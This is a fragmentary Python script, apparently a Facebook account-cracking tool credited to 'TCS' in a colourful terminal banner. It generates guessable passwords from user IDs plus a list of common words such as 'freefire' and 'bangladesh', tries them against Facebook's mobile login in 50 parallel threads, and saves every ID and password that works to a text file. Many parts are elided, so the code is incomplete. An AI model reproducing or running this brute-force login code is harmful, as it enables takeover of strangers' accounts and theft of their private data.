...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By TCS")
...
\033[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\033[38;5;46m ▊   ‌‌‌‌‌‌                                              ██
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \033[38;5;196m: \33[97;1mSAIMUL ISLAM  \033[38;5;46m              
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \033[38;5;196m: \033[1;92m𝐀𝐫𝐚𝐟𝐚𝐭 𝐇𝐨𝐬𝐬𝐚𝐢𝐧   \033[38;5;46m          
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩  \033[38;5;196m: \033[1;92m+𝟖𝟖𝟎𝟏𝟑𝟏𝟕𝟒𝟖\033[38;5;46m                 
\033[38;5;46m ▊\033[93;1m❥\033[92;1m⋆\033[93;1m❦ \033[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \033[38;5;196m: \033[1;92m𝐡𝐭𝐭𝐩𝐬://𝐠𝐢𝐭𝐡𝐮𝐛.𝐜𝐨𝐦/....   \033[38;5;46m
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/TCS-CYBER-404');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def x():
	...
	with ThreadPool(max_workers=50) as yaari:
		...
		for guru in user:
			...
			ps2 = uid[5:]
			ps3 = uid[4:]
			pwx = [uid,ps1,ps2,ps3,'freefire','bangladesh','freefire1122','Free Fire','freefire123','i love you']
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/TCS-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
...
def c(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mTCS\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/TCS-ok.txt', 'a').write(cid+' | '+ps+'\n')
                break
            else:
                continue
        loop+=1        
